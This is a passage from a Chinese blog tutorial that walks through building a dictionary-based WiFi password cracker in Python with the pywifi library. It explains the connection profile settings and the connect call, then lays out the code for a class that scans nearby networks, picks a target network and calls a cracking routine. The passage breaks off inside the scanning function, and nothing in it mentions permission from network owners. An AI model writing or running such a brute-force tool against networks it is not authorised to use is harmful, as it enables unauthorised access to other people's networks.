<li><p><code>profile.akm.append(const.AKM_TYPE_WPA2PSK)</code>是加密单元，这个是必须要设置的，常用的加密单元有：<code>AKM_TYPE_NONE</code>（无加密），<code>AKM_TYPE_WPA</code>（WPA），<code>AKM_TYPE_WPAPSK</code>（WPA-PSK），<code>AKM_TYPE_WPA2</code>（WPA2），<code>AKM_TYPE_WPA2PSK</code>（WPA2-PSK）。</p>
</li>
<li><p><code>profile.cipher</code>是加密单元，这个是必须要设置的，常用的加密单元有：<code>const.CIPHER_TYPE_NONE</code>（无加密），<code>const.CIPHER_TYPE_WEP</code>（WEP），<code>const.CIPHER_TYPE_TKIP</code>（TKIP），<code>const.CIPHER_TYPE_CCMP</code>（CCMP）。</p>
</li>
</ul>
<hr>
<blockquote>
<p><strong>这四个是必须要设置的,下面我们讲解他们的不同。</strong></p>
</blockquote>
<hr>
<blockquote>
<p>对于<code>profile.auth</code>的认证算法，我们一般选择<code>const.AUTH_ALG_OPEN</code>，<code>const.AUTH_ALG_SHARED</code>，在<strong>pywifi</strong> 库中支持这两个,大家可以左键看一下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">AUTH_ALG_OPEN = <span class="number">0</span> <span class="comment">#开放认证系统(认证阶段不需要提供密码)</span></span><br><span class="line">AUTH_ALG_SHARED = <span class="number">1</span> <span class="comment">#共享密钥认证系统(认证阶段需要提供密码，但是密钥是共享的，安全性低)</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>我们一般设置为<code>const.AUTH_ALG_OPEN</code>，尽管他是<strong>开放系统</strong>(即不需要在认证阶段提供密码)，但是我们使用的<code>WPA/WPA2</code>加密算法(AKM)，连接WiFi就需要密码验证。</p>
<p><strong>简单点说，就算是我们设置了开放系统认证<code>const.AUTH_ALG_OPEN</code>，但只要AKM的加密算法在，我们连接网络就需要密码</strong></p>
<p>讲这个是为了防止大家认为只要设置了<code>const.AUTH_ALG_OPEN</code>，就不需要密码，其实不然，我们设置了<code>const.AUTH_ALG_OPEN</code>，那么连接网络就需要密码。但是如果我们没有配置<code>const.AUTH_ALG_OPEN</code>，就可能会导致连接失败。</p>
<hr>
<blockquote>
<p>对于<code>profile.akm.append(const.AKM_TYPE_WPA2PSK)</code>的加密单元，我们一般选择<code>AKM_TYPE_WPA2PSK</code>，在<strong>pywifi</strong> 库中支持的还有其他几个，大家可以左键看一下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">AKM_TYPE_NONE = <span class="number">0</span> <span class="comment">#没有安全设置，网络不使用加密，任何人都可以连接，通常不推荐使用，因为它不提供任何数据保护</span></span><br><span class="line">AKM_TYPE_WPA = <span class="number">1</span> <span class="comment">#WPA（WiFi Protected Access）认证，使用TKIP（Temporal Key Integrity Protocol）作为加密算法，是一种较老的加密标准</span></span><br><span class="line">AKM_TYPE_WPAPSK = <span class="number">2</span> <span class="comment">#WPA-PSK（Pre-Shared Key）认证，是WPA的个人版，使用TKIP加密算法，需要用户输入预共享密钥（即WiFi密码）</span></span><br><span class="line">AKM_TYPE_WPA2 = <span class="number">3</span> <span class="comment">#WPA2认证，使用CCMP（Counter Mode with Cipher Block Chaining Message Authentication Code Protocol）作为加密算法，是一种更安全的加密标准</span></span><br><span class="line">AKM_TYPE_WPA2PSK = <span class="number">4</span> <span class="comment">#WPA2-PSK认证，是WPA2的个人版，使用CCMP加密算法，需要用户输入预共享密钥</span></span><br><span class="line">AKM_TYPE_UNKNOWN = <span class="number">5</span> <span class="comment">#未知的AKM类型，通常用于在未能识别网络的AKM类型时提供一个通用的值</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>我们一般选择<code>AKM_TYPE_WPA2PSK</code>，因为这个算法是当前最广泛的加密算法，也就是平常咱们用的WiFi的加密方式。</p>
<hr>
<blockquote>
<p>对于<code>profile.cipher</code>的加密单元，我们一般选择<code>const.CIPHER_TYPE_CCMP</code>，在<strong>pywifi</strong> 库中支持的还有其他几个，大家可以左键看一下.</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">CIPHER_TYPE_NONE = <span class="number">0</span> <span class="comment">#没有加密，数据传输不使用加密算法。这通常与 AKM_TYPE_NONE 一起使用，适用于没有安全设置的开放网络</span></span><br><span class="line">CIPHER_TYPE_WEP = <span class="number">1</span> <span class="comment">#使用WEP（Wired Equivalent Privacy）加密算法，这是一种较老的加密标准，现在已经不推荐使用，因为它容易受到安全攻击</span></span><br><span class="line">CIPHER_TYPE_TKIP = <span class="number">2</span> <span class="comment">#使用TKIP（Temporal Key Integrity Protocol）加密算法，这是WPA（WiFi Protected Access）标准使用的加密方式</span></span><br><span class="line">CIPHER_TYPE_CCMP = <span class="number">3</span> <span class="comment">#使用CCMP（Counter Mode with Cipher Block Chaining Message Authentication Code Protocol）加密算法，这是WPA2（WiFi Protected Access 2）标准使用的加密方式，比TKIP更安全</span></span><br><span class="line">CIPHER_TYPE_UNKNOWN = <span class="number">4</span> <span class="comment">#未知的加密单元，通常用于在未能识别网络的加密单元时提供一个通用的值,通常不使用</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>这里我们选择<code>const.CIPHER_TYPE_CCMP</code>，因为我们前面选择的是<code>AKM_TYPE_WPA2PSK</code>加密方式，这个加密方式使用的是<code>CCMP</code>加密单元，而对应的这里选择的加密单元也必须是<code>CCMP</code>,要对应一致，否则连接不上WiFi，而<code>pywifi</code>提供的加密单元中只有<code>CIPHER_TYPE_CCMP</code>提供CCMP加密单元。</p>
<hr>
<p><strong>接下来，我们开始连接WiFi.</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">ifaces.remove_all_network_profiles() <span class="comment">#删除所有wifi配置文件</span></span><br><span class="line"></span><br><span class="line">tep_profile = ifaces.add_network_profile(profile) <span class="comment">#加载新的wifi连接文件</span></span><br><span class="line"></span><br><span class="line">ifaces.connect(tep_profile) <span class="comment">#连接上面的wifi文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ifaces.status() == const.IFACE_CONNECTED: <span class="comment">#如果wifi已连接</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  如果仍未连接</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>ifaces.remove_all_network_profiles()</code>是删除所有wifi配置文件，这个是必须要做的，因为我们每次连接wifi，都需要创建一个新的配置文件，如果不删除，就会出现多个配置文件，导致连接失败。</p>
</li>
<li><p><code>tep_profile = ifaces.add_network_profile(profile)</code>是加载新的wifi连接文件，这个是必须要做的，因为我们每次连接wifi，都需要创建一个新的配置文件，如果不加载，就会出现连接失败。</p>
</li>
<li><p><code>ifaces.connect(tep_profile)</code>是连接上面的wifi文件。</p>
</li>
</ul>
<p>最后通过<code>if</code>判断进行判断是否连接成功，如果连接成功，打印<code>True</code>，如果连接失败，打印<code>False</code>。</p>
<hr>
<p>到现在，我们基础的<code>pywifi</code>的基础用法就讲完了，这样大家基本上也就能自己做出一个基于字典的WiFi密码破解器了，大家可以先自行尝试一下，接下来，我就来讲解我的WiFi密码破解器。</p>
<hr>
<h3 id="代码解析-代码整体思路"><a href="#代码解析-代码整体思路" class="headerlink" title="代码解析:代码整体思路"></a>代码解析:代码整体思路</h3><p>我打算以后再做一个GUI的界面，然后就使用了类的方法进行实现WiFi密码破解器的功能。</p>
<ul>
<li>判断自身网络连接情况</li>
<li>扫描附近WiFi</li>
<li>选择要破解的WiFi</li>
<li>破解WiFi</li>
</ul>
<p>我们的思路很简单照着这个开始写代码就可以了。</p>
<h4 id="代码实现-pywifi基本需要"><a href="#代码实现-pywifi基本需要" class="headerlink" title="代码实现:pywifi基本需要"></a>代码实现:pywifi基本需要</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">__author__ = <span class="string">&#x27;ximenxiaoxue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys <span class="comment">#进行错误检查</span></span><br><span class="line"><span class="keyword">import</span> random <span class="comment">#快速排序使用</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pywifi </span><br><span class="line"><span class="keyword">from</span> pywifi <span class="keyword">import</span> const,Profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 功能：</span></span><br><span class="line"><span class="comment">#1.判断自身是否连接到wifi</span></span><br><span class="line"><span class="comment">#2.选择是否进行wifi密码破解，新建一个函数进行选择</span></span><br><span class="line"><span class="comment">#3.进行破解</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wifi_attack_main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  <span class="comment">#这个是整个程序的入口，看这个函数的步骤就可以分析整个程序的流程了</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.wifi = pywifi.PyWiFi() <span class="comment">#创建wifi对象</span></span><br><span class="line">        <span class="variable language_">self</span>.iface = <span class="variable language_">self</span>.wifi.interfaces()[<span class="number">0</span>] <span class="comment">#获取第一个无线网卡</span></span><br><span class="line">        <span class="variable language_">self</span>.wifi_status = <span class="variable language_">self</span>.iface.status()<span class="comment">#获取无线网卡状态</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>首先，我们的思路都在 <code>__init__</code> 函数里面，在这里实现我们要操作的内容。<br>这里面的代码也很简单都是我们先前讲的<code>pywifi</code>的基础用法。</p>
<h4 id="代码实现-判断自身网络连接情况"><a href="#代码实现-判断自身网络连接情况" class="headerlink" title="代码实现:判断自身网络连接情况"></a>代码实现:判断自身网络连接情况</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  <span class="comment">#这个是整个程序的入口，看这个函数的步骤就可以分析整个程序的流程了</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.wifi = pywifi.PyWiFi() <span class="comment">#创建wifi对象</span></span><br><span class="line">    <span class="variable language_">self</span>.iface = <span class="variable language_">self</span>.wifi.interfaces()[<span class="number">0</span>] <span class="comment">#获取第一个无线网卡</span></span><br><span class="line">    <span class="variable language_">self</span>.wifi_status = <span class="variable language_">self</span>.iface.status()<span class="comment">#获取无线网卡状态</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.choice = <span class="variable language_">self</span>.Choice() <span class="comment">#选择是否进行wifi密码破解</span></span><br><span class="line">    <span class="variable language_">self</span>.wifi_attack(<span class="variable language_">self</span>.choice) <span class="comment">#进行wifi攻击</span></span><br></pre></td></tr></table></figure></div>

<p>我们再写一个函数来根据WiFi的连接情况进行连接网络的判断，也就是<code>Choice</code>函数。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Choice</span>(<span class="params">self</span>):<span class="comment">#选择是否进行wifi密码破解</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请保证网络开关已打开&quot;</span>+ <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="comment">#time.sleep(3)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.wifi_status == const.IFACE_DISCONNECTED:  <span class="comment"># 判断无线网卡是否连接</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;网络未连接&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;网络已连接&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#循环选择是否进行wifi密码破解</span></span><br><span class="line">        choose_2 = <span class="built_in">input</span>(<span class="string">&quot;是否进行wifi密码破解程序？(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> choose_2 == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> choose_2 == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;执行破解程序......&quot;</span>)</span><br><span class="line">            choice = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> choice</span><br><span class="line">        <span class="keyword">elif</span> choose_2 == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> choose_2 == <span class="string">&quot;no&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在退出程序&quot;</span>)</span><br><span class="line">            choice = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> choice</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入错误，请重新输入&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这个函数的功能是判断是否进行wifi密码破解，代码也并不难，就是使用<code>pywifi</code>库的<code>status()</code>方法来判断无线网卡的状态，然后根据状态进行选择是否进行wifi密码破解。</p>
<p>为了避免输入错误的情况，我们选择使用<code>while</code>循环来进行选择，直到输入正确为止。</p>
<p>再根据选择弹出<code>choice</code>变量，如果选择进行破解，则<code>choice</code>为<code>True</code>，否则为<code>False</code>。</p>
<p>我们后面要根据这个<code>choice</code>变量来选择是否进行破解程序的执行。</p>
<h4 id="代码实现-破解操作"><a href="#代码实现-破解操作" class="headerlink" title="代码实现:破解操作"></a>代码实现:破解操作</h4><p>我们也会先写一个专门用于破解的函数，也就是<code>wifi_attack</code>函数。</p>
<p>我们也要先明白，这个函数具体要干什么，这个函数是个<strong>框架</strong>，具体的实现要到其他函数里面去。</p>
<hr>
<ul>
<li>首先，我们根据<code>choice</code>变量来判断是否进行破解程序的执行。<ul>
<li>如果<code>choice</code>为<code>True</code>，我们就开始进行破解程序的执行。<ul>
<li>首先，我们先扫描附近的WiFi，获取到目标WiFi的相关信息。</li>
<li>然后，处理我们获取到的目标WiFi的相关信息。</li>
<li>然后，选择需要破解的WiFi。</li>
<li>最后，创建WiFi配置文件，连接目标WiFi，破解密码。</li>
</ul>
</li>
<li>如果<code>choice</code>为<code>False</code>，我们就退出程序。</li>
</ul>
</li>
</ul>
<hr>
<p>这就是我们的<code>wifi_attack</code>函数的整个框架，我们按照这个思路来实现整个函数。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wifi_attack</span>(<span class="params">self,choice</span>):</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="literal">True</span>:</span><br><span class="line">        item_dict = <span class="variable language_">self</span>.wifi_scan() <span class="comment">#扫描wifi</span></span><br><span class="line">        count,singnal_list = <span class="variable language_">self</span>.read_wifi_data(item_dict)<span class="comment">#读取wifi数据</span></span><br><span class="line">        wifi_name_attack = <span class="variable language_">self</span>.wifi_attack_choose(count,singnal_list) <span class="comment">#选择需要破解的wifi</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.wifi_crack(wifi_name_attack) <span class="comment">#破解wifi密码</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已退出&quot;</span>)</span><br><span class="line"></span><br><span class="line">        num = <span class="built_in">input</span>(<span class="string">&quot;按任意键退出&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>所以我们一开始判断是否进行wifi密码破解，然后根据选择进行破解程序的执行。<br>如果为<code>True</code>，我们就开始进行破解程序的执行。</p>
</blockquote>
<p>简单的退出程序写完了，我们再根据思路来写破解的程序。</p>
<p>按照思路，<strong>第一步</strong>，我们先扫描附近的WiFi，获取到目标WiFi的相关信息。</p>
<p>写一个函数<code>wifi_scan()</code>来实现这个功能。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wifi_scan</span>(<span class="params">self</span>):</span><br><span class="line"> <span class="comment">#扫描wifi</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;正在扫描wifi...&quot;</span>+ <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"> time.sleep(<span class="number">2</span>) <span class="comment">#不休眠扫描不全</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">try</span>:</span><br><span class="line">     <span class="variable language_">self</span>.iface.scan()  <span class="comment"># 扫描附近的wifi</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.iface.scan_results():</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;正在扫描...&quot;</span>)</span><br><span class="line"> <span class="keyword">except</span>:</span><br><span class="line">        sys.exit(<span class="string">&quot;扫描失败，请检查网络连接&quot;</span>)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;扫描完成&quot;</span>)</span><br><span class="line"> num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> wifi_list_parameter = &#123;<span class="string">&#x27;SSID&#x27;</span>: [], <span class="string">&#x27;Singnal level&#x27;</span>: [], <span class="string">&#x27;BSSID&#x27;</span>: [], <span class="string">&#x27;Frequency&#x27;</span>: []&#125;</span><br><span class="line"> <span class="keyword">for</span> bss <span class="keyword">in</span> <span class="variable language_">self</span>.iface.scan_results():</span><br><span class="line">     num += <span class="number">1</span></span><br><span class="line">     <span class="comment"># print(&quot;SSID: %s&quot; % bss.ssid)  # wifi名称</span></span><br><span class="line">     <span class="comment"># print(&quot;Singnal level: %s&quot; % bss.signal)  # 信号强度,信号强度是负数，越接近0网络强度越好</span></span><br><span class="line">     <span class="comment"># print(&quot;BSSID: %s&quot; % bss.bssid)  # MAC地址</span></span><br><span class="line">     <span class="comment"># # print(&quot;Encryption: %s&quot; % bss.encryption)</span></span><br><span class="line">     <span class="comment"># print(&quot;Frequency: %s&quot; % bss.freq)  # 频率 2472000为2.4G网络，5745000为5G网络</span></span><br><span class="line">     <span class="comment"># print(&quot;=&quot; * 20)</span></span><br><span class="line">     <span class="comment">#</span></span><br><span class="line">     wifi_list_parameter[<span class="string">&#x27;SSID&#x27;</span>].append(bss.ssid)</span><br><span class="line">     wifi_list_parameter[<span class="string">&#x27;Singnal level&#x27;</span>].append(bss.signal)</span><br><span class="line">     wifi_list_parameter[<span class="string">&#x27;BSSID&#x27;</span>].append(bss.bssid)</span><br><span class="line">     wifi_list_parameter[<span class="string">&#x27;Frequency&#x27;</span>].append(bss.freq)</span><br><span class="line"></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;*&quot;</span> * <span class="number">20</span>)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;共扫描到%d个wifi&quot;</span> % (num-<span class="number">1</span>)) <span class="comment">#不知道为啥pywifi会多扫描一个，所以-1</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> * <span class="number">20</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">#print(wifi_list_parameter)</span></span><br><span class="line"> <span class="keyword">return</span> wifi_list_parameter</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>咱们正常的先扫描一下wifi，也就是使用<code>iface.scan()</code>方法，然后使用<code>iface.scan_results()</code>方法来获取扫描到的wifi信息。</p>
<p>不过大家都知道这<code>iface.scan_results()</code>方法正常打印根本就看不懂，所以我们需要处理这个方法。</p>
<p>正常打印的结果如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">[&lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA521032C0</span>&gt;, &lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA52103350</span>&gt;, &lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA52103380</span>&gt;, &lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA521033B0</span>&gt;, &lt;pywifi.profile.Profile <span class="built_in">object</span> at <span class="number">0x000001DA521033E0</span>&gt;]</span><br></pre></td></tr></table></figure></div>

<p>但是我们要知道的是，这个列表返回的每个实例的<strong>内存地址</strong>，这也就表明他们都是独立的实例，所以我们不能直接打印这个列表，我们可以通过遍历的方法，查看每个对象的详细信息。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> bss <span class="keyword">in</span> <span class="variable language_">self</span>.iface.scan_results():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SSID: %s&quot;</span> % bss.ssid)  <span class="comment"># wifi名称</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Singnal level: %s&quot;</span> % bss.signal)  <span class="comment"># 信号强度,信号强度是负数，越接近0网络强度越好</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BSSID: %s&quot;</span> % bss.bssid)  <span class="comment"># MAC地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Frequency: %s&quot;</span> % bss.freq)  <span class="comment"># 频率 2472000为2.4G网络，5745000为5G网络</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">20</span>)</span><br></pre></td></tr></table></figure></div>

<p>通过这样遍历，我们可以打印出我们需要的wifi信息。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">SSID: szpjwfhm</span><br><span class="line">Singnal level: -<span class="number">58</span></span><br><span class="line">BSSID: cc:2d:<span class="number">21</span>:e5:cc:b1:</span><br><span class="line">Frequency: <span class="number">2417000</span></span><br><span class="line">====================</span><br><span class="line">SSID: MERCURY_9CEE</span><br><span class="line">Singnal level: -<span class="number">81</span></span><br><span class="line">BSSID: 6c:<span class="number">59</span>:<span class="number">40</span>:7e:9c:ee:</span><br><span class="line">Frequency: <span class="number">2472000</span></span><br><span class="line">====================</span><br><span class="line">SSID: szpjwfhm_5G</span><br><span class="line">Singnal level: -<span class="number">74</span></span><br><span class="line">BSSID: cc:2d:<span class="number">21</span>:e5:cc:b5:</span><br><span class="line">Frequency: <span class="number">5745000</span></span><br><span class="line">====================</span><br><span class="line">SSID: CMCC-5Z94</span><br><span class="line">Singnal level: -<span class="number">65</span></span><br><span class="line">BSSID: ec:6c:b5:ea:3f:<span class="number">28</span>:</span><br><span class="line">Frequency: <span class="number">2442000</span></span><br><span class="line">====================</span><br><span class="line">SSID: szpjwfhm</span><br><span class="line">Singnal level: -<span class="number">58</span></span><br><span class="line">BSSID: cc:2d:<span class="number">21</span>:e5:cc:b1:</span><br><span class="line">Frequency: <span class="number">2417000</span></span><br><span class="line">====================</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>除了这些，然后按住<code>Ctrl</code>键，然后<strong>鼠标左键点击</strong><code>scan_results()</code>对象，就可以看到这个对象的详细信息,我们还会发现下面这些信息：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">scan_results</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Return the scan result.&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    bsses = <span class="variable language_">self</span>._wifi_ctrl.scan_results(<span class="variable language_">self</span>._raw_obj)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>._logger.isEnabledFor(logging.INFO):</span><br><span class="line">        <span class="keyword">for</span> bss <span class="keyword">in</span> bsses:</span><br><span class="line">            <span class="variable language_">self</span>._logger.info(<span class="string">&quot;Find bss:&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>._logger.info(<span class="string">&quot;\tbssid: %s&quot;</span>, bss.bssid)</span><br><span class="line">            <span class="variable language_">self</span>._logger.info(<span class="string">&quot;\tssid: %s&quot;</span>, bss.ssid)</span><br><span class="line">            <span class="variable language_">self</span>._logger.info(<span class="string">&quot;\tfreq: %d&quot;</span>, bss.freq)</span><br><span class="line">            <span class="variable language_">self</span>._logger.info(<span class="string">&quot;\tauth: %s&quot;</span>, bss.auth)</span><br><span class="line">            <span class="variable language_">self</span>._logger.info(<span class="string">&quot;\takm: %s&quot;</span>, bss.akm)</span><br><span class="line">            <span class="variable language_">self</span>._logger.info(<span class="string">&quot;\tsignal: %d&quot;</span>, bss.signal)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bsses</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>除了我们打印的那些，我们还能知道WiFi的认证方式(bss.auth)，加密方式(bss.akm)，咱们这里就不打印了，如果大家需要可以自行改造。</p>
<p>这样我们就获取了附近WiFi的信息，但是，我们想一想，这些数据是需要我们存储起来要用的，我们就得想个法子把我们获取到的WiFi的信息保存起来。</p>
<p>我的方法是使用一个字典，把获取到的信息都存到字典里面，但是我们存放就会有一个问题，他们都是同一个<strong>键值</strong>，我们要怎么存放起来？</p>
<p>所以，我选择使用在每个<strong>键值</strong>上关联一个<strong>列表</strong>，这样就能把相同键值的数据存放到一块去了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">wifi_list_parameter = &#123;<span class="string">&#x27;SSID&#x27;</span>: [], <span class="string">&#x27;Singnal level&#x27;</span>: [], <span class="string">&#x27;BSSID&#x27;</span>: [], <span class="string">&#x27;Frequency&#x27;</span>: []&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这样，我们想要去取出数据也是很简单的，毕竟是列表嘛，我们直接索引就可以了。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">wifi_list_parameter[<span class="string">&#x27;键值&#x27;</span>].append(bss.数据)</span><br></pre></td></tr></table></figure></div>

<p>这样我们就把获取到的WiFi信息都存到字典里面了,最后，我们简单写个统计函数，统计一下有多少个wifi，但是我发现，他总是会莫名其妙的多扫描一个，而且经常把强度最强那个WiFi多扫描一遍，所以，我就使用了<code>num-1</code>来统计。大家可以去尝试一下这个问题。</p>
<blockquote>
<p>前面，我们也提到了，<strong>如果网络开关没有打开怎么办？</strong>，我们就在这里加个判断，如果网络开关没有打开，就退出程序，提示用户打开网络开关，我们使用<code>try...excepy</code>语法配合<code>sys.exit()</code>方法来实现这个功能，如果网络开关关闭就退出程序。</p>
</blockquote>
<p>最后,我们弹出我们存储的WiFi信息 <strong>(因为我们后面还要处理WiFi信息，把WiFi强度大的放在前面)</strong>,即<code>wifi_list_parameter</code>，我们这个函数的成品就是这样：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wifi_scan</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment">#扫描wifi</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在扫描wifi...&quot;</span>+ <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>) <span class="comment">#不休眠扫描不全</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="variable language_">self</span>.iface.scan()  <span class="comment"># 扫描附近的wifi</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.iface.scan_results():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在扫描...&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">           sys.exit(<span class="string">&quot;扫描失败，请检查网络连接&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;扫描完成&quot;</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    wifi_list_parameter = &#123;<span class="string">&#x27;SSID&#x27;</span>: [], <span class="string">&#x27;Singnal level&#x27;</span>: [], <span class="string">&#x27;BSSID&#x27;</span>: [], <span class="string">&#x27;Frequency&#x27;</span>: []&#125;</span><br><span class="line">    <span class="keyword">for</span> bss <span class="keyword">in</span> <span class="variable language_">self</span>.iface.scan_results():</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        wifi_list_parameter[<span class="string">&#x27;SSID&#x27;</span>].append(bss.ssid)</span><br><span class="line">        wifi_list_parameter[<span class="string">&#x27;Singnal level&#x27;</span>].append(bss.signal)</span><br><span class="line">        wifi_list_parameter[<span class="string">&#x27;BSSID&#x27;</span>].append(bss.bssid)</span><br><span class="line">        wifi_list_parameter[<span class="string">&#x27;Frequency&#x27;</span>].append(bss.freq)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;*&quot;</span> * <span class="number">20</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;共扫描到%d个wifi&quot;</span> % (num-<span class="number">1</span>)) <span 